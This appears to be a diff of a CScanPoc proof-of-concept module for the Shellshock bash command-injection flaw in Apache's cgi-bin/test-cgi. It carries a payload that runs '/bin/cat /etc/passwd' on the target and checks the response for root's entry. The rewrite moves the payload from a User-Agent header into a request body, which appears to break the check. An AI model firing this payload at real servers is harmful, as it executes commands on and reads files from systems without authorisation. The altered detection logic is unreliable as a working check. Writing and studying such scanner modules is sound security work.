@@ -3,7 +3,6 @@
 from CScanPoc.thirdparty import requests,hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
-
 class Vuln(ABVuln):
     vuln_id = 'Apache_0000' # 平台漏洞编号，留空
     name = 'Apache目录下会有一个cgi-bin/test-cgi bash 远程命令执行' # 漏洞名称
@@ -35,11 +34,10 @@ class Poc(ABPoc):
             payload = '/cgi-bin/test-cgi'
             payload2 = '() { foo;}echo;/bin/cat /etc/passwd' 
             url = '{target}'.format(target=self.target)+payload
-            code, head, res, errcode, _ = hh.http(url)
-                       
-            if code == 200 :
-                code, head, res, errcode, _ = hh.http('-A "%s" %s' %(payload2,url))
-                if code ==200 and 'root:x:0:0:' in res:
+            req = requests.get(url)
+            if req.status_code == 200 :
+                req1 = requests.get(url, data=payload2)
+                if req1.status_code ==200 and 'root:x:0:0:' in req1.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
